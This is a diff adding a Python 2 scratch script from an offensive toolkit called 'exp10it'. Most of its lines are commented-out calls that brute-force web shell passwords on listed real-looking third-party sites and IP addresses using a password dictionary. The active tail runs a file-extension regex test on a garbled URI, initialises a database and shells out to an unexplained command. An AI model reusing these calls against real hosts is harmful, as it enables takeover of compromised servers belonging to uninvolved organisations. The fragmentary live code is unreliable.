@@ -1,0 +1,25 @@
+from exp10it import *
+#crack_php_direct_webshell_uri("http://211.104.160.218/404.php","dicts/webshell_passwords.txt")
+#crack_webshell("http://localhost/404.php")
+#crack_php_biaodan_webshell_uri("http://dss.hkcss.org.hk/liceses.php","","dicts/webshell_passwords.txt")
+#crack_php_biaodan_webshell_uri("http://localhost/priv8.php","","dicts/webshell_passwords.txt")
+#crack_webshell("https://webmail.fes.org.hk/aspnet_client/system_web/2_0_50727/error.aspx")
+#crack_webshell("http://localhost/priv8.php")
+#crack_webshell("http://192.168.3.168/data1/config.php")
+#crack_webshell("http://www.elite-machinery.com/dy/css.asp")
+#crack_webshell("http://192.168.3.166/098765ljk.asp")
+#crack_webshell("http://www.hkctu.org.hk/web/cms-en/files/upload/custom/css.jsp")
+#get_request("http://www.baidu.com")
+#get_request("http://www.elite-machinery.com/conn.asp")
+#crack_webshell("https://www.mirafloresbcc.com/gallery_images/1428732062.php")
+#crack_webshell("http://www.cml.com.cn/data/license2.php")
+#crack_webshell("http://www.islamweb.net/Server.php")
+#crack_webshell("http://www.islamweb.net/Test11.php",1)
+#crack_webshell("http://consult.islamweb.net/ShowPic.php")
+current_uri="http://niah.haode ./1.txt/2.png/.1o.jpa"
+resource_file_pattern=re.compile(r"^http.*(\.(jpg)|(jpeg)|(gif)|(png)|(bmp)|(txt)|(doc)|(docx)|(pdf)|(txt)|(xls)|(xlsx)|(rar)|(zip)|(avi)|(mp4)|(rmvb)|(flv)|(mp3)|(mkv)|(7z)|(gz)|(htaccess)|(ini)|(xml)|(key))$",re.I)
+if re.match(resource_file_pattern,current_uri):
+    print 66666666
+raw_input()
+database_init()
+os.system("mm")
